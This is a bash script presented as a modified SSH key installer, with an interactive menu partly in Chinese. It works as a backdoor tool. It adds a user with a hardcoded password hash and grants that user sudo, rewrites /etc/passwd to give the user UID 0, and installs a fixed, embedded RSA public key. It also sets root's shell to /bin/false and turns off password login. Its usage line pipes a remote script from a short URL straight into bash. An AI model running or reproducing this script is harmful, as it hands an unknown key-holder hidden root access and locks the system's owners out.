#!/usr/bin/env bash
#=============================================================
# https://github.com/P3TERX/SSH_Key_Installer
# Description: Install SSH keys via GitHub, URL or local files
# Version: 2.7
# Author: P3TERX
# Blog: https://p3terx.com
#=============================================================

PUB_KEY="ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEA00OceT1qUKCu9CvoUUnCAlV6Jb/U7qJZbE55ipZ0K2YU/LQMVrySrWvgbnPBVbckQUIQJyin8d6NaNqW4lRCDRYpRqWBdjQAh3F0GDk9Hu9cysgt2Zk+k3ZkVB4fY4wZ4v+NFav33CZtMQCd6fp4Yg6OL+Iol6o8muQSYrg43IkB79toslazEwAT1Xlnh5oHEIrLs6NFwUysitx7OLUUXkeMr3PWoq3LoQn+zwXQz0HsPuCurWuOnYok3BtkxZdwlge6lvGNSKll3OukS2p5B5eyOAbDTxWD7l87Mm3GHEWX7D06t8+Q6qduPTHuxv2fFdA/XSsCu9AYjk7fplDIqQ== rsa 2048-122021"
RED_FONT_PREFIX="\033[31m"
LIGHT_GREEN_FONT_PREFIX="\033[1;32m"
FONT_COLOR_SUFFIX="\033[0m"
INFO="[${LIGHT_GREEN_FONT_PREFIX}INFO${FONT_COLOR_SUFFIX}]"
ERROR="[${RED_FONT_PREFIX}ERROR${FONT_COLOR_SUFFIX}]"
[ $EUID != 0 ] && SUDO=sudo
div="------------------------------------------------------------------------------------------------------"

USAGE() {
    echo $div
    echo "

░█▀▀▀█ ░█▀▀▀█ ░█ ░█ 　 ░█ ▄▀ ░█▀▀▀ ░█  ░█ 　 
─▀▀▀▄▄ ─▀▀▀▄▄ ░█▀▀█ 　 ░█▀▄  ░█▀▀▀ ░█▄▄▄█ 　 
░█▄▄▄█ ░█▄▄▄█ ░█ ░█ 　 ░█ ░█ ░█▄▄▄   ░█  　 
"
    echo "This SHELL is modified by 875 personality
    
Usage:
  bash <(curl -fsSL git.io/875.sh)

Options:
  1)	Add user			(USERNAME)
  2)	Get root access			(USERNAME)
  3)	install SSH key			(USERNAME PUB_KEY)
  4)	Disable password login
  5)	Disabled root
  6)	Change SSH port			(SSH_PORT)
  o)	Overwrite mode
  r)	Restart ssh
  0)	exit
"
}

add_user() {
  echo -e "${INFO} Add user is ${USERNAME} ..."
  if [ $(id -u) -eq 0 ]; then
    useradd -m -p '$6$px9DVnNu$OD7VGyei68//74pi8MizyEFbmJn7zMCUZ0rMpse2rSjZe7lys/uN5EHDIO6WXhs0L8YeFZx6FFilbipdReZT20' -g root -s /bin/bash ${USERNAME} 
    [ $? -eq 0 ] && echo -e "${INFO} User added successfully!" || echo -e "${ERROR}Failed to add a user!"
    $SUDO sed -i "/^root/a ${USERNAME}\tALL=(ALL) \tALL" /etc/sudoers
    [ $? -eq 0 ] && echo -e "${INFO} Sudoers added successfully!" || echo -e "${ERROR}Sudoers add added!"
  else
    echo "Only root may add a user to the system"
  fi
}

get_root() {
        LINE=`cat /etc/passwd |grep -n ${USERNAME} | awk -F: '{print $1}'|sed -n 1p`
        $SUDO sed -i "${LINE}s/x:.*:0/x:0:0/g" /etc/passwd && {
            echo -e "${INFO} Get root access successfully."
            false_root
        } || {
            echo -e "${ERROR} Get root access failed!"
        }
        
}

false_root() {
        usermod -s /bin/false root
        [ $? -eq 0 ]&& echo -e "${INFO} Root disabled SSH successfully.." || echo -e "${ERROR} Root disabled SSH failed!"
        
}

install_key() {
    [ "${PUB_KEY}" == '' ] && echo "${ERROR} ssh key does not exist." 
    if [ ! -f "/home/${USERNAME}/.ssh/authorized_keys" ]; then
        echo -e "${INFO} '/home/${USERNAME}/.ssh/authorized_keys' is missing..."
        echo -e "${INFO} Creating /home/${USERNAME}/.ssh/authorized_keys..."
        mkdir -p /home/${USERNAME}/.ssh/
        touch /home/${USERNAME}/.ssh/authorized_keys
        if [ ! -f "/home/${USERNAME}/.ssh/authorized_keys" ]; then
            echo -e "${ERROR} Failed to create SSH key file."
        else
            echo -e "${INFO} Key file created, proceeding..."
        fi
    fi
    if [ "${OVERWRITE}" == 1 ]; then
        echo -e "${INFO} Overwriting SSH key..."
        echo -e "${PUB_KEY}\n" >/home/${USERNAME}/.ssh/authorized_keys
    else
        echo -e "${INFO} Adding SSH key..."
        echo -e "\n${PUB_KEY}\n" >>/home/${USERNAME}/.ssh/authorized_keys
    fi
    chmod 700 /home/${USERNAME}/.ssh/
    chmod 600 /home/${USERNAME}/.ssh/authorized_keys
    chown -R ${USERNAME}:root /home/${USERNAME}
    [[ $(grep "${PUB_KEY}" "/home/${USERNAME}/.ssh/authorized_keys") ]] &&
        echo -e "${INFO} SSH Key installed successfully!" || {
        echo -e "${ERROR} SSH key installation failed!"
    }
}

change_port() {
    echo -e "${INFO} Changing SSH port to ${SSH_PORT} ..."
    if [ $(uname -o) == Android ]; then
        [[ -z $(grep "Port " "$PREFIX/etc/ssh/sshd_config") ]] &&
            echo -e "${INFO} Port ${SSH_PORT}" >>$PREFIX/etc/ssh/sshd_config ||
            sed -i "s@.*\(Port \).*@\1${SSH_PORT}@" $PREFIX/etc/ssh/sshd_config
        [[ $(grep "Port " "$PREFIX/etc/ssh/sshd_config") ]] && {
            echo -e "${INFO} SSH port changed successfully!"
            echo -e "${INFO} Restart sshd or Termux App to take effect."
        } || {
            echo -e "${ERROR} SSH port change failed!"
        }
    else
        $SUDO sed -i "s@.*\(Port \).*@\1${SSH_PORT}@" /etc/ssh/sshd_config && {
            echo -e "${INFO} SSH port changed successfully!"
            restart_ssh
        } || {
            echo -e "${ERROR} SSH port change failed!"
        }
    fi
}

disable_password() {
    if [ $(uname -o) == Android ]; then
        sed -i "s@.*\(PasswordAuthentication \).*@\1no@" $PREFIX/etc/ssh/sshd_config && {
            echo -e "${INFO} Restart sshd or Termux App to take effect."
            echo -e "${INFO} Disabled password login in SSH."
        } || {
            echo -e "${ERROR} Disable password login failed!"
        }
    else
        $SUDO sed -i "s@.*\(PasswordAuthentication \).*@\1no@" /etc/ssh/sshd_config && {
            echo -e "${INFO} Disabled password login in SSH."
            restart_ssh
        } || {
            echo -e "${ERROR} Disable password login failed!"
        }
    fi
}

restart_ssh() {
    echo -e "${INFO} Restarting sshd..."
    $SUDO systemctl restart sshd && echo -e "${INFO} Done."
}

is_next() {
    echo -n -e "\033[33m还想干点啥别的不？ [y/n]: \033[0m"
    read contine
    if [ "${contine}" == "n" -o "${contine}" == "N" ]
    then
        exit 0
    fi
}

is_null(){

	while :
	do
	    read key
	    if [ ! $key ]; then
	        echo -n -e "${ERROR} ${RED_FONT_PREFIX}啥都没输入重输：${FONT_COLOR_SUFFIX}"
	    else
	    	break	        
	    fi
	done
}

check_user() {
	n=`cat /etc/passwd | cut -d ":" -f 1 | grep -n "^$1$"| cut -d ":" -f 1`
	if [ -z "$n" ]
	then
		echo -e "用户\033[44;37m $1 \033[0m不存在"
		return 0
	else
		echo -e "用户\033[44;37m $1 \033[0m已经存在"
		return 1
	fi
}

is_right(){	
    if [ ! $USERNAME ]
    then
	  echo -e -n "\033[36m请输入${1}\033[0m"
       is_null
       check_user $key
       if [ $? -eq 0 ]; then
          return 0
       else
          USERNAME=$key
          return 1
       fi
    else
        echo -e -n "用户是不是 \033[44;37m ${USERNAME} \033[0m [y/n]: "
        read contine
        if [ "${contine}" == "n" -o "${contine}" == "N" ]
        then
            echo -n "请输入$1"
            is_null
            check_user $key
            if [ $? -eq 0 ]; then
              return 0
            else
              USERNAME=$key
              return 1
            fi
        fi
        return 1
    fi
}

choice() {
    case $opinion in
    1)
        echo -n -e "\033[36m请输入要增加的用户名：\033[0m"
        is_null
        USERNAME=$key
        check_user $USERNAME 
        [ $? -eq 0 ] && add_user 
        is_next
        ;;
    2)
        is_right "要获取权限的用户名："
        [ $? -eq 0 ] || get_root
        is_next
        ;;
    3)
        is_right "安装的用户目录："
        [ $? -eq 0 ] || install_key
        is_next
        ;;
    4)
        disable_password
        is_next
        ;;
    5)
        false_root
        is_next
        ;;
    6)
        echo -n -e "\033[36m 请输入端口号：\033[0m"
        is_null
        SSH_PORT=$key
        change_port
        is_next
        ;;
    o)
        OVERWRITE=1
        echo -e "${INFO} Overwrite is On!"
        sleep 1
        ;;
    r)
        restart_ssh
        sleep 1
        ;;
    0)
        exit 0
        ;;
    ?)
        USAGE
        ;;
    :)
        USAGE
        ;;
    *)
        USAGE
        ;;
    
esac

}

while :
do
    USAGE
    read -p "please enter your choice : " opinion
    choice
done


